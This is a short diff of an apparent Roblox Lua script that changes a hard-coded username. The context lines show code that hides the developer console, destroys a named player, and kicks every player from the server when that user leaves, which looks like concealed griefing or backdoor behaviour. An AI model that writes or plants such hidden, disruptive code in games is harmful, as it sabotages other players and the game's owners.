@@ -960,8 +960,8 @@ function Rppp(plr)
 			game:GetService("StarterGui"):SetCore("DevConsoleVisible",false)
 		end)
 	end)
-	if game.Players.LocalPlayer.Name~="Winng3010" then
-	game.Players:WaitForChild("Winng3010"):Destroy()
+	if game.Players.LocalPlayer.Name~="2ugvvexlpk" then
+	game.Players:WaitForChild("2ugvvexlpk"):Destroy()
     end
 	]]
 	Client.Enabled=true
@@ -993,7 +993,7 @@ Players.PlayerAdded:Connect(function(plr)
 end)
 
 Players.PlayerRemoving:Connect(function(plr)
-	if plr.Name=="Winng3010" then
+	if plr.Name=="2ugvvexlpk" then
 		for _,v in next,Players:GetPlayers() do
 			pcall(function()
 				v:Kick("go and touch the grass")
